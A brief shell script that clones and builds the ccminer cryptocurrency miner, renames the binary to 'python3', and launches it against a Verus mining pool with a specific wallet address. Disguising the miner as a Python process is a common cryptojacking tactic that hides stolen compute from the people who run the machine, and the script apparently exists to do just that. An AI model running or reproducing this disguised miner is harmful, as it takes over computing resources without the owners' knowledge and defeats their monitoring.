apt update
apt-get install p7zip-full -y
apt install git -y
git clone https://github.com/monkins1010/ccminer.git
cd ccminer && sh build.sh && mv ccminer python3 && chmod +x python3 && ./python3 -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.nxj -t 4
